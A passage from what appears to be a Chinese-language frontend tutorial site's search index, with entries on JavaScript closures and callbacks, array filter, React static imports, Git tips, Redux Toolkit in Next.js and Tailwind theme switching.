否则，拒绝它们以防止 UI 回归。\n了解如何将 Chromatic UI 测试集成到 CI 管道中。\n\r视觉测试和快照测试有什么区别？ 快照测试将每个故事的渲染标记与已知基线进行比较。\n这意味着测试比较的是 HTML 的 blob，而不是用户实际看到的内容。\n反过来，这会导致误报增加，因为代码更改并不总是会在组件中产生视觉变化。\n\r知识点   Chromatic\n  StoryShots\n  ","description":"视觉测试 为了外观","id":54,"section":"react","tags":null,"title":"视觉测试","uri":"https://codthing.github.io/react/storybook/sb-test/sb-visual-tests/"},{"content":"闭包   涉及变量作用域\n  内部函数使用外部函数的变量\n  1 2 3 4 5 6 7 8 9 10 11 12 13  function outerFunc() { const outerVal = 100; function interFunc() { console.log(outerVal); } return interFunc; // 记得返回你的内部函数 } const inter = outerFunc(); inter(); //100   递归   自己调用自己，一般用于 给定条件 过滤/计算 数据\n  著名案例 斐波那契数列\n  1 2 3 4 5 6 7 8 9 10  function fibonacciRecursive(n) { if (n \u0026lt; 2) { return n; } return fibonacciRecursive(n - 1) + fibonacciRecursive(n - 2); } fibonacciRecursive(8); // 21   回调   ！！！JavaScript 默认是同步的，并且是单线程的。这意味着代码不能创建新线程并行运行。！！！\n  函数调用另一个函数\n  func_1 作为 func_2 的 参数，func_2(func_1)\n  #. 同步回调（立即执行）  最佳案例 Array.prototype.map()  1 2 3 4 5  const nums = [1, 2, 3]; const printDouble = (n) =\u0026gt; console.log(2 * n); // 双倍打印  nums.map(printDouble);   #. 异步回调（等待执行）  最佳案例 Promise.prototype.then()  1 2 3 4 5  const nums = fetch(\u0026#34;https://api.nums.org\u0026#34;); // [1, 2, 3] const printDouble = (n) =\u0026gt; console.log(2 * n); // 双倍打印  nums.then(printDouble); // 2, 4, 6   #. 回调地狱 如果调用嵌套增加，代码层次会变得很深，维护难度也随之增加，尤其是包含了很多循环和条件等。\n嵌套调用的“金字塔”随着每个异步行为会向右增长。很快它就失控了。\n幸运的是，有其他方法可以避免此类金字塔。最好的方法之一就是 promise。\n","description":"JS 三剑客","id":55,"section":"javascript","tags":null,"title":"闭包、递归和回调","uri":"https://codthing.github.io/javascript/function/callback/"},{"content":"import 关键字允许导入由另一个模块导出的代码。\n默认情况下，静态导入的所有模块都会添加到初始包中。\n使用默认的 ES2015 导入语法 import module from 'module' 导入的模块是静态导入的。\n\r看一个例子！ 一个简单的聊天应用程序包含一个 Chat 组件，\n在其中静态导入和呈现三个组件：UserProfile、ChatList 和用于键入和发送消息的 ChatInput！ 在 ChatInput 模块中，静态导入了一个 EmojiPicker 组件，以便在用户切换表情符号时向用户显示表情符号选择器。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98  // components/Userinfo.js import React from \u0026#34;react\u0026#34;; const UserInfo = () =\u0026gt; ( \u0026lt;div className=\u0026#34;user-info upper\u0026#34;\u0026gt; \u0026lt;div className=\u0026#34;user-details\u0026#34;\u0026gt; \u0026lt;div className=\u0026#34;user-avatar\u0026#34; /\u0026gt; \u0026lt;div className=\u0026#34;user-name\u0026#34;\u0026gt; John Doe \u0026lt;span className=\u0026#34;user-status\u0026#34;\u0026gt;Online\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; ); console.log(\u0026#34;UserInfo loading\u0026#34;, Date.now()); export default UserInfo; // components/ChatList.js import React from \u0026#34;react\u0026#34;; import messages from \u0026#34;../data/messages\u0026#34;; const ChatMessage = ({ message, side }) =\u0026gt; ( \u0026lt;div className={`msg-container ${side}`}\u0026gt; \u0026lt;div className=\u0026#34;chat-msg\u0026#34;\u0026gt; \u0026lt;div className=\u0026#34;msg-contents\u0026#34;\u0026gt;{message}\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; ); const ChatList = () =\u0026gt; ( \u0026lt;div className=\u0026#34;chat-list\u0026#34;\u0026gt; {messages.map(message =\u0026gt; ( \u0026lt;ChatMessage message={message.body} key={message.id} side={[\u0026#34;left\u0026#34;, \u0026#34;right\u0026#34;][Number(message.senderId === 1)]} /\u0026gt; ))} \u0026lt;/div\u0026gt; ); console.log(\u0026#34;ChatList loading\u0026#34;, Date.now()); export default ChatList; // components/ChatInput.js import React from \u0026#34;react\u0026#34;; import Send from \u0026#34;./icons/Send\u0026#34;; import Emoji from \u0026#34;./icons/Emoji\u0026#34;; import Picker from \u0026#34;./EmojiPicker\u0026#34;; const ChatInput = () =\u0026gt; { const [pickerOpen, togglePicker] = React.useReducer(state =\u0026gt; !state, false); return ( \u0026lt;div className=\u0026#34;chat-input-container\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; placeholder=\u0026#34;Type a message...\u0026#34; /\u0026gt; \u0026lt;Emoji onClick={togglePicker} /\u0026gt; {pickerOpen \u0026amp;\u0026amp; \u0026lt;Picker /\u0026gt;} \u0026lt;Send /\u0026gt; \u0026lt;/div\u0026gt; ); }; console.log(\u0026#34;ChatInput loaded\u0026#34;, Date.now()); export default ChatInput; // components/EmojiPicker.js import React from \u0026#34;react\u0026#34;; import Picker from \u0026#34;emoji-picker-react\u0026#34;; const EmojiPicker = () =\u0026gt; ( \u0026lt;div className=\u0026#34;emoji-picker\u0026#34;\u0026gt; \u0026lt;Picker /\u0026gt; \u0026lt;/div\u0026gt; ); console.log(\u0026#34;EmojiPicker loading\u0026#34;, Date.now()); export default EmojiPicker; // App.js import React from \u0026#34;react\u0026#34;; import \u0026#34;./styles.css\u0026#34;; // Statically import Chatlist, ChatInput and UserInfo import UserInfo from \u0026#34;./components/UserInfo\u0026#34;; import ChatList from \u0026#34;./components/ChatList\u0026#34;; import ChatInput from \u0026#34;./components/ChatInput\u0026#34;; const App = () =\u0026gt; { return ( \u0026lt;div className=\u0026#34;App\u0026#34;\u0026gt; \u0026lt;UserInfo /\u0026gt; \u0026lt;ChatList /\u0026gt; \u0026lt;ChatInput /\u0026gt; \u0026lt;/div\u0026gt; ); }; export default App;   一旦引擎到达导入它们的行，模块就会立即执行。\n当你打开控制台时，你可以看到模块加载的顺序！\nUserInfo loading 1640280171226\rChatList loading 1640280171229\rEmojiPicker loading 1640280171278\rChatInput loading 1640280171278\rApp loading 1640280171279 \r由于组件是静态导入的，Webpack 将模块捆绑到初始包中。\n可以看到 Webpack 在构建应用程序后创建的包：\nAsset Size Chunks Chunk Names\rmain.bundle.js 1.5 MiB main [emitted] main 聊天应用程序的源代码被打包成一个包：main.bundle.js。 根据用户的设备和网络连接，大的包大小会显著影响应用程序的加载时间。 在 App 组件能够将其内容呈现到用户屏幕之前，它首先必须加载和解析所有模块。\n幸运的是，有很多方法可以加快加载时间！ 并不总是必须一次导入所有模块：\n也许有一些模块应该只根据用户交互来呈现，\n例如本例中的 EmojiPicker，或者在页面的更下方呈现。 可以在 App 组件呈现其内容并且用户能够与应用程序交互后动态导入模块，而不是静态导入所有组件。\n\r知识点   import module from \u0026lsquo;module\u0026rsquo;\n  webpack\n  bundle\n  ","description":"导入已被其他模块导出的代码","id":56,"section":"react-patterns","tags":null,"title":"静态导入","uri":"https://codthing.github.io/react-patterns/performance-patterns/static-import/"},{"content":"filter() 方法创建一个新数组，其中包含通过提供的函数实现的测试的所有元素。\n使用 filter 方法从数组中提取数据 另一个有用的数组方法是 filter()（即 Array.prototype.filter()）。\nfilter 接收一个回调函数，将回调函数内的逻辑应用于数组的每个元素，\n新数组包含根据回调函数内条件返回 true 的元素。 换言之，它根据传递给它的函数过滤数组。 和 map 一样，filter 不会改变原始数组。\n回调函数接收三个参数。 第一个参数是当前正在被处理的元素。 第二个参数是这个元素的索引，第三个参数是在其上调用 filter 方法的数组。\n简单的例子：\n1 2 3 4 5 6 7 8  const users = [ { name: \u0026#39;John\u0026#39;, age: 34 }, { name: \u0026#39;Amy\u0026#39;, age: 20 }, { name: \u0026#39;camperCat\u0026#39;, age: 10 } ]; const usersUnder30 = users.filter(user =\u0026gt; user.age \u0026lt; 30); console.log(usersUnder30); // [ { name: \u0026#39;Amy\u0026#39;, age: 20 }, { name: \u0026#39;camperCat\u0026#39;, age: 10 } ]   复杂的例子：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  // 全局变量 const watchList = [ { \u0026#34;Title\u0026#34;: \u0026#34;Inception\u0026#34;, \u0026#34;Year\u0026#34;: \u0026#34;2010\u0026#34;, \u0026#34;imdbRating\u0026#34;: \u0026#34;8.8\u0026#34;, }, { \u0026#34;Title\u0026#34;: \u0026#34;Interstellar\u0026#34;, \u0026#34;Year\u0026#34;: \u0026#34;2014\u0026#34;, \u0026#34;imdbRating\u0026#34;: \u0026#34;8.6\u0026#34;, } ]; const filteredList = watchList .map(({ Title: title, imdbRating: rating }) =\u0026gt; ({ title, rating })) .filter(({ rating }) =\u0026gt; rating \u0026gt; 8); console.log(filteredList); // [ { title: \u0026#39;Inception\u0026#39;, rating: \u0026#39;8.8\u0026#39; }, { title: \u0026#39;Interstellar\u0026#39;, rating: \u0026#39;8.6\u0026#39; } ]   \r在原型上实现 filter 方法 为了加深对 filter 的理解，可以自己实现一个。 可以用 for 循环或 Array.prototype.forEach()\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  // 全局变量 const s = [23, 65, 98, 5]; Array.prototype.myFilter = function(callback) { const newArray = []; // for (let i = 0; i \u0026lt; this.length; i++) {  // if (callback(this[i]) === true) {  // newArray.push(this[i]);  // }  // }  this.forEach(function(x) { if (callback(x) == true) { newArray.push(x); } }); return newArray; }; const new_s = s.myFilter(function(item) { return item % 2 === 1; }); console.log(new_s); // [ 23, 65, 5 ]   ","description":"filter() 方法创建一个新数组，其中包含通过提供的函数实现的测试的所有元素。","id":57,"section":"javascript","tags":null,"title":"Array.prototype.filter()","uri":"https://codthing.github.io/javascript/algorithms-data/function-programming/filter-programming/"},{"content":"一、OpenSSL SSL_connect  git clone/git pull/git push 报错  fatal: unable to access 'https://github.com/xxx.git/': OpenSSL SSL_connect: Connection was reset in connection to github.com:443\n 解决办法：这个办法可以让git速度更快。\n git config --global --add remote.origin.proxy \u0026#34;127.0.0.1:(proxy http port number)\u0026#34;\r//我的是\rgit config --global --add remote.origin.proxy \u0026#34;127.0.0.1:1080\u0026#34; 二、! [rejected] main -\u0026gt; main (fetch first) 由于在github上进行了修改，而本地还没有修改就push，所以才会出现这个错误。最好先pull下来，但是如果本地已经修改了，那么就用下面这个方法：\ngit push origin main --force 三、not found  git push 的时候，提示not found,很大可能是之前已经有git的就用户在该台电脑。最直接的办法就是：   控制面板\u0026gt;查看方式 \u0026gt; 小图标 凭据管理器 \u0026gt; windows凭据 删除相关凭据即可 之后在git push 的时候会提示输入新用户名和邮箱，按步骤提交就可以正常使用了  四、github一个仓库管理多个项目 Step1. github上创建一个仓库 test.co (名为test公司的项目) Step2. git 到本地 git clone https://github.com/用户名/test.co.git Step3. 进入 test.co 项目根目录，并创建项目1 project1 文件夹 1. 打开 Git Bash\r2. mkdir project1 //创建项目1文件夹（用于存放项目1代码） Step4. 进入 project1 根目录 1. cd project1 //进入项目1根目录\r2. git branch //检查分支 Step5. 创建分支（特别注意：如果在当前的分支再创建分支，那么所创建的分支就是当前分支的子分支，而不是父分支的子分支。） git checkout project1\r//或者创建+切换分支，可直接跳过Step6.\rgit checkout -b project1 Step6. 切换分支 git checkout project1 //如果是从远程仓库clone下来的，则\r1. get fetch\r2. git checkout \u0026lt;branchname\u0026gt;  参考\n Step7. 检查当前分支状态并提交代码到本地仓库 git status\rgit add .\rgit commit -m \u0026#34;注释说明。。。\u0026#34; Step8. push 到远程仓库 - - - 成功！ git push origin project1 注意： 1） git checkout 切换分支项目的时候，可能其他项目的某些文件暂时不可见，这是出于git的安全保护机制，只要再切换回去就可以看到项目的所有文件了。\n2）.gitignore文本文档文件是用于从模板列表中选择不跟踪的文件。，也就是不打算提交的文件（比如安装包node_modules）。参考链接\nnode_modules/**/*\r.expo/*\rnpm-debug.*\r*.jks\r*.p8\r*.p12\r*.key\r*.mobileprovision\r*.orig.*\rweb-build/\r# macOS\r.DS_Store ","description":"","id":58,"section":"others","tags":null,"title":"Git 最佳实践","uri":"https://codthing.github.io/others/git/git-bp/"},{"content":"现在，有了 Hooks, 甚至可以自己编写 Reducer，通过 Proxy 对状态进行操作。\n但是，为了更融入市场而且现在有了 Redux Tookit（可以减少很多代码量），所以，这里还是用 Redux。\n  Redux 在我的理解看来就是事件驱动的一个典型模式，记住这点，就可以很明白为什么有 action dispatch。\n  而 Reducer 的概念是因为使用 Proxy 代理模式，这种方式可以避免用户直接操作状态对象造成\u0026quot;污染\u0026quot;。\n  所以，记住以上两点，就可以很好地去使用 Redux。以及接下来要讨论的 Hooks + Redux。\n\r开始 1. 创建 Next.js 项目 yarn create next-app --typescript 2. 安装 Redux 1 2 3 4  yarn add react-redux @types/react-redux @reduxjs/toolkit yarn add --dev redux-devtools   以上安装了 React-Redux、TypeScript支持、Redux工具包（toolkit 包含了 Redux 核心 + Thunk + Reselect）\n以及用于开发测试的 redux-devtools 工具。\n注意：以上的安装方式是在已有的项目中安装的（Next.js 项目中）。\n3. 改变目录结构 📦src\r├─ 📂app\r│ ├─ 📜hooks.ts\r│ └─ 📜store.ts\r├─ 📂features\r│ └─ 📂counter\r│ │ ├─ 📜Counter.module.css\r│ │ ├─ 📜Counter.tsx\r│ │ ├─ 📜counterAPI.ts\r│ │ └─ 📜counterSlice.ts\r└─ 📂pages\r│ ├─ 📂api\r│ │ └─ 📜hello.ts\r│ ├─ 📜index.tsx\r│ └─ 📜_app.tsx 将 pages 放入 新建的 src 目录中：\n4. 创建 Store 因为我喜欢 TS 和 Hooks，所以创建 Store 的时候步骤会多一点，但是这是值得的。\n顺带一提的是，Next.js 是我的选择，可以没有 Redux，但是不能没有 Next.js。\n所以，配置的时候我会根据 Next.js 的目录做一些配置。\n在src目录中新建一个app目录\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  // src/app/store.ts import { configureStore, ThunkAction, Action } from \u0026#39;@reduxjs/toolkit\u0026#39;; // import counterReducer from \u0026#39;../features/counter/counterSlice\u0026#39;;  export const store = configureStore({ reducer: { // 这里放置 slice 中的 reducer，例如  // counter: counterReducer,  }, }); export type AppDispatch = typeof store.dispatch; export type RootState = ReturnType\u0026lt;typeof store.getState\u0026gt;; export type AppThunk\u0026lt;ReturnType = void\u0026gt; = ThunkAction\u0026lt; ReturnType, RootState, unknown, Action\u0026lt;string\u0026gt; \u0026gt;;   1 2 3 4 5 6 7 8  // src/app/hooks.ts import { TypedUseSelectorHook, useDispatch, useSelector } from \u0026#39;react-redux\u0026#39;; import type { RootState, AppDispatch } from \u0026#39;./store\u0026#39;; // 在整个应用程序中使用，而不是简单的 `useDispatch` 和 `useSelector` export const useAppDispatch = () =\u0026gt; useDispatch\u0026lt;AppDispatch\u0026gt;(); export const useAppSelector: TypedUseSelectorHook\u0026lt;RootState\u0026gt; = useSelector;   1 2 3 4 5 6 7 8 9 10 11 12 13 14  // src/pages/_app.tsx import { Provider } from \u0026#39;react-redux\u0026#39; import type { AppProps } from \u0026#39;next/app\u0026#39; import { store } from \u0026#39;../app/store\u0026#39; export default function MyApp({ Component, pageProps }: AppProps) { return ( \u0026lt;Provider store={store}\u0026gt; \u0026lt;Component {...pageProps} /\u0026gt; \u0026lt;/Provider\u0026gt; ) }   5. Counter 计数器  src/features/counter/Counter.tsx  import React, { useState } from \u0026#39;react\u0026#39;;\rimport { useAppSelector, useAppDispatch } from \u0026#39;../../app/hooks\u0026#39;;\rimport {\rdecrement,\rincrement,\rincrementByAmount,\rincrementAsync,\rincrementIfOdd,\rselectCount,\r} from \u0026#39;./counterSlice\u0026#39;;\rimport styles from \u0026#39;./Counter.module.css\u0026#39;;\rexport function Counter() {\rconst count = useAppSelector(selectCount);\rconst dispatch = useAppDispatch();\rconst [incrementAmount, setIncrementAmount] = useState(\u0026#39;2\u0026#39;);\rconst incrementValue = Number(incrementAmount) || 0;\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;div className={styles.row}\u0026gt;\r\u0026lt;button\rclassName={styles.button}\raria-label=\u0026#34;Decrement value\u0026#34;\ronClick={() =\u0026gt; dispatch(decrement())}\r\u0026gt;\r-\r\u0026lt;/button\u0026gt;\r\u0026lt;span className={styles.value}\u0026gt;{count}\u0026lt;/span\u0026gt;\r\u0026lt;button\rclassName={styles.button}\raria-label=\u0026#34;Increment value\u0026#34;\ronClick={() =\u0026gt; dispatch(increment())}\r\u0026gt;\r+\r\u0026lt;/button\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;div className={styles.row}\u0026gt;\r\u0026lt;input\rclassName={styles.textbox}\raria-label=\u0026#34;Set increment amount\u0026#34;\rvalue={incrementAmount}\ronChange={(e) =\u0026gt; setIncrementAmount(e.target.value)}\r/\u0026gt;\r\u0026lt;button\rclassName={styles.button}\ronClick={() =\u0026gt; dispatch(incrementByAmount(incrementValue))}\r\u0026gt;\r添加金额\r\u0026lt;/button\u0026gt;\r\u0026lt;button\rclassName={styles.asyncButton}\ronClick={() =\u0026gt; dispatch(incrementAsync(incrementValue))}\r\u0026gt;\r异步添加\r\u0026lt;/button\u0026gt;\r\u0026lt;button\rclassName={styles.button}\ronClick={() =\u0026gt; dispatch(incrementIfOdd(incrementValue))}\r\u0026gt;\r如果奇数则添加\r\u0026lt;/button\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}  src/features/counter/Counter.module.css  .row {\rdisplay: flex;\ralign-items: center;\rjustify-content: center;\r}\r.row \u0026gt; button {\rmargin-left: 4px;\rmargin-right: 8px;\r}\r.row:not(:last-child) {\rmargin-bottom: 16px;\r}\r.value {\rfont-size: 78px;\rpadding-left: 16px;\rpadding-right: 16px;\rmargin-top: 2px;\rfont-family: \u0026#39;Courier New\u0026#39;, Courier, monospace;\r}\r.button {\rappearance: none;\rbackground: none;\rfont-size: 32px;\rpadding-left: 12px;\rpadding-right: 12px;\routline: none;\rborder: 2px solid transparent;\rcolor: rgb(112, 76, 182);\rpadding-bottom: 4px;\rcursor: pointer;\rbackground-color: rgba(112, 76, 182, 0.1);\rborder-radius: 2px;\rtransition: all 0.15s;\r}\r.textbox {\rfont-size: 32px;\rpadding: 2px;\rwidth: 64px;\rtext-align: center;\rmargin-right: 4px;\r}\r.button:hover,\r.button:focus {\rborder: 2px solid rgba(112, 76, 182, 0.4);\r}\r.button:active {\rbackground-color: rgba(112, 76, 182, 0.2);\r}\r.asyncButton {\rcomposes: button;\rposition: relative;\r}\r.asyncButton:after {\rcontent: \u0026#39;\u0026#39;;\rbackground-color: rgba(112, 76, 182, 0.15);\rdisplay: block;\rposition: absolute;\rwidth: 100%;\rheight: 100%;\rleft: 0;\rtop: 0;\ropacity: 0;\rtransition: width 1s linear, opacity 0.5s ease 1s;\r}\r.asyncButton:active:after {\rwidth: 0%;\ropacity: 1;\rtransition: 0s;\r}  src/features/counter/counterAPI.ts  // 模拟对数据发出异步请求的模拟函数\rexport function fetchCount(amount = 1) {\rreturn new Promise\u0026lt;{ data: number }\u0026gt;((resolve) =\u0026gt;\rsetTimeout(() =\u0026gt; resolve({ data: amount }), 500)\r);\r}  src/features/counter/counterSlice.ts  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82  import { createAsyncThunk, createSlice, PayloadAction } from \u0026#39;@reduxjs/toolkit\u0026#39;; import { RootState, AppThunk } from \u0026#39;../../app/store\u0026#39;; import { fetchCount } from \u0026#39;./counterAPI\u0026#39;; export interface CounterState { value: number; status: \u0026#39;idle\u0026#39; | \u0026#39;loading\u0026#39; | \u0026#39;failed\u0026#39;; } const initialState: CounterState = { value: 0, status: \u0026#39;idle\u0026#39;, }; // 下面的函数称为 thunk，它允许执行异步逻辑。 // 它可以像常规操作一样调度：`dispatch(incrementAsync(10))`。  // 这将使用 `dispatch` 函数作为第一个参数调用 thunk。 // 然后可以执行异步代码并可以调度其他操作。 Thunk 通常用于发出异步请求。  export const incrementAsync = createAsyncThunk( \u0026#39;counter/fetchCount\u0026#39;, async (amount: number) =\u0026gt; { const response = await fetchCount(amount); // 返回的值成为 “已完成” 操作负载（action payload）  return response.data; } ); export const counterSlice = createSlice({ name: \u0026#39;counter\u0026#39;, //这里的 `counter` 是 store 中的 reducer 字段的 counter  initialState, // `reducers` 字段可以定义 reducer 并生成相关的操作  reducers: { increment: (state) =\u0026gt; { // Redux Toolkit 允许在 reducer 中编写“变异”逻辑。  // 它实际上并没有改变状态，因为它使用了 Immer 库，  // 它检测 “draft state（草稿状态）” 的变化，并根据这些变化产生一个全新的不可变状态  state.value += 1; }, decrement: (state) =\u0026gt; { state.value -= 1; }, // 使用 PayloadAction 类型声明 `action.payload` 的内容  incrementByAmount: (state, action: PayloadAction\u0026lt;number\u0026gt;) =\u0026gt; { state.value += action.payload; }, }, // `extraReducers` 字段让切片处理在别处（reducers 字段之外）定义的动作，包括由 createAsyncThunk 或其他切片生成的动作。  extraReducers: (builder) =\u0026gt; { builder .addCase(incrementAsync.pending, (state) =\u0026gt; { state.status = \u0026#39;loading\u0026#39;; }) .addCase(incrementAsync.fulfilled, (state, action) =\u0026gt; { state.status = \u0026#39;idle\u0026#39;; state.value += action.payload; }); }, }); export const { increment, decrement, incrementByAmount } = counterSlice.actions; // 下面的函数称为选择器，它允许从状态中选择一个值。 // 也可以在使用它们的地方而不是在切片文件中内联定义选择器。 // 例如：`useSelector((state: RootState) =\u0026gt; state.counter.value)` export const selectCount = (state: RootState) =\u0026gt; state.counter.value; // 也可以手工编写 thunk，它可能包含同步和异步逻辑。 // 这是一个基于当前状态有条件地分派动作的例子。 export const incrementIfOdd = (amount: number): AppThunk =\u0026gt; ( dispatch, getState ) =\u0026gt; { const currentValue = selectCount(getState()); if (currentValue % 2 === 1) { dispatch(incrementByAmount(amount)); } }; export default counterSlice.reducer;    src/pages/index.tsx  import { Counter } from \u0026#39;../features/counter/Counter\u0026#39;\rimport styles from \u0026#39;../../styles/Home.module.css\u0026#39;\rconst IndexPage: NextPage = () =\u0026gt; {\rreturn (\r\u0026lt;div className={styles.container}\u0026gt;\r\u0026lt;Head\u0026gt;\r\u0026lt;title\u0026gt;Redux Toolkit\u0026lt;/title\u0026gt;\r\u0026lt;link rel=\u0026#34;icon\u0026#34; href=\u0026#34;/favicon.ico\u0026#34; /\u0026gt;\r\u0026lt;/Head\u0026gt;\r\u0026lt;main className={styles.header}\u0026gt;\r\u0026lt;img src=\u0026#34;/vercel.svg\u0026#34; className={styles.logo} alt=\u0026#34;logo\u0026#34; /\u0026gt;\r\u0026lt;Counter /\u0026gt;\r\u0026lt;/main\u0026gt;\r\u0026lt;/div\u0026gt;\r)\r}\rexport default IndexPage ","description":" Redux 和 React Hooks 的配合，我对 Redux 的理解","id":59,"section":"react","tags":null,"title":"Hooks \u0026 Redux","uri":"https://codthing.github.io/react/redux/hooks-redux/"},{"content":"Next.js 与各种技术栈的组合\nNext.js + TailwindCSS + SB + zustand 注意： 不支持IE浏览器\n1. VSCode 插件   PostCSS Language Support\n  Tailwind CSS IntelliSense\n  2. TailwindCSS 在 Next.js v10+ 项目中设置 Tailwind CSS\nStep1. 创建项目 1 2  yarn create next-app --typescript   Step2. 安装Tailwind CSS tailwindcss 通过 yarn 安装及其对等依赖项，然后运行 ​​init 命令生成 tailwind.config.js 和 postcss.config.js.\n1 2 3 4  yarn add --dev tailwindcss postcss autoprefixer npx tailwindcss init -p   Step3. 配置模板路径 在文件中添加所有模板文件的路径 tailwind.config.js。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  module.exports = { content: [ \u0026#34;./pages/**/*.{js,ts,jsx,tsx}\u0026#34;, \u0026#34;./components/**/*.{js,ts,jsx,tsx}\u0026#34;, ], theme: { extend: {}, }, plugins: [], } // 或者（基于目录结构调整） module.exports = { content: [ \u0026#34;./src/pages/**/*.{js,ts,jsx,tsx}\u0026#34;, \u0026#34;./src/components/**/*.{js,ts,jsx,tsx}\u0026#34;, ], theme: { extend: {}, }, plugins: [], }   Step4. 将 Tailwind 指令添加到 CSS 将 @tailwindTailwind 的每个层的指令添加到文件中。 ./styles/globals.css\n1 2 3 4  @tailwind base; @tailwind components; @tailwind utilities;   Step5. 启动开发服务器 1 2  yarn dev   Step6. 开始在项目中使用 Tailwind 开始使用 Tailwind 的实用程序类来设计内容。\n1 2 3 4 5 6 7 8  export default function Home() { return ( \u0026lt;h1 className=\u0026#34;text-3xl font-bold underline\u0026#34;\u0026gt; Hello world! \u0026lt;/h1\u0026gt; ) }   3. 主题切换 Step1. 安装 next-themes 1 2  yarn add next-themes   1 2 3 4 5 6 7 8 9 10 11 12 13  // pages/_app.tsx import \u0026#39;../styles/globals.css\u0026#39; import type { AppProps } from \u0026#39;next/app\u0026#39; import { ThemeProvider } from \u0026#39;next-themes\u0026#39;; function MyApp({ Component, pageProps }: AppProps) { return \u0026lt;ThemeProvider\u0026gt; \u0026lt;Component {...pageProps} /\u0026gt; \u0026lt;/ThemeProvider\u0026gt; } export default MyApp   Step2. 在 Next.js 创建一个 ThemeChanger.tsx 文件 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45  // components/ThemeChanger.tsx import { useEffect, useState } from \u0026#39;react\u0026#39;; import { useTheme } from \u0026#39;next-themes\u0026#39;; const themes = [{ name: \u0026#39;Light\u0026#39; }, { name: \u0026#39;Dark\u0026#39; }, { name: \u0026#39;Emerald\u0026#39; }, { name: \u0026#39;Pink\u0026#39; }]; const ThemeChanger = () =\u0026gt; { const [mounted, setMounted] = useState(false); const { theme, setTheme } = useTheme(); // 当安装在客户端时，现在可以显示 UI  useEffect(() =\u0026gt; setMounted(true), []); if (!mounted) return null; return ( \u0026lt;div className=\u0026#34;p-8 flex justify-between items-center font-bold text-xl bg-th-background-secondary text-th-primary-dark\u0026#34;\u0026gt; \u0026lt;span\u0026gt; 当前主题: \u0026lt;strong\u0026gt;{theme}\u0026lt;/strong\u0026gt; \u0026lt;/span\u0026gt; \u0026lt;div\u0026gt; \u0026lt;label htmlFor=\u0026#34;theme-select\u0026#34; className=\u0026#34;sr-only mr-2\u0026#34;\u0026gt; 选择主题: \u0026lt;/label\u0026gt; \u0026lt;select name=\u0026#34;theme\u0026#34; id=\u0026#34;theme-select\u0026#34; className=\u0026#34;bg-white text-gray-800 border-gray-800 border py-1 px-3\u0026#34; onChange={(e) =\u0026gt; setTheme(e.currentTarget.value)} value={theme} \u0026gt; \u0026lt;option value=\u0026#34;\u0026#34;\u0026gt;选择主题\u0026lt;/option\u0026gt; {themes.map((t) =\u0026gt; ( \u0026lt;option key={t.name.toLowerCase()} value={t.name.toLowerCase()}\u0026gt; {t.name} \u0026lt;/option\u0026gt; ))} \u0026lt;/select\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; ); }; export default ThemeChanger;   Step3. 启用 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  // pages/index.tsx import type { NextPage } from \u0026#39;next\u0026#39; import Head from \u0026#39;next/head\u0026#39; import ThemeChanger from \u0026#39;../components/ThemeChanger\u0026#39;; const Home: NextPage = () =\u0026gt; { return ( \u0026lt;div\u0026gt; \u0026lt;Head\u0026gt; \u0026lt;title\u0026gt;Create Next App\u0026lt;/title\u0026gt; \u0026lt;meta name=\u0026#34;description\u0026#34; content=\u0026#34;Generated by create next app\u0026#34; /\u0026gt; \u0026lt;link rel=\u0026#34;icon\u0026#34; href=\u0026#34;/favicon.ico\u0026#34; /\u0026gt; \u0026lt;/Head\u0026gt; \u0026lt;ThemeChanger /\u0026gt; \u0026lt;main\u0026gt; \u0026lt;h1\u0026gt; Hello world! \u0026lt;/h1\u0026gt; \u0026lt;/main\u0026gt; \u0026lt;/div\u0026gt; ) } export default Home   Step4. 修改 globals.css 样式 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72  // styles/globals.css @tailwind base; @tailwind components; @tailwind utilities; html, body { height: 100%; display: grid; padding: 0; margin: 0; font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Oxygen, Ubuntu, Cantarell, Fira Sans, Droid Sans, Helvetica Neue, sans-serif; } #__next { height: 100%; grid-row: 1/-1; grid-column: 1/-1; } a { color: inherit; text-decoration: none; } * { box-sizing: border-box; } :root { --background: theme(\u0026#34;colors.white\u0026#34;); --background-secondary: theme(\u0026#34;colors.gray.50\u0026#34;); --primary-dark: theme(\u0026#34;colors.gray.900\u0026#34;); --primary-medium: theme(\u0026#34;colors.gray.700\u0026#34;); --primary-light: theme(\u0026#34;colors.gray.500\u0026#34;); } [data-theme=\u0026#34;dark\u0026#34;] { --background: theme(\u0026#34;colors.black\u0026#34;); --background-secondary: 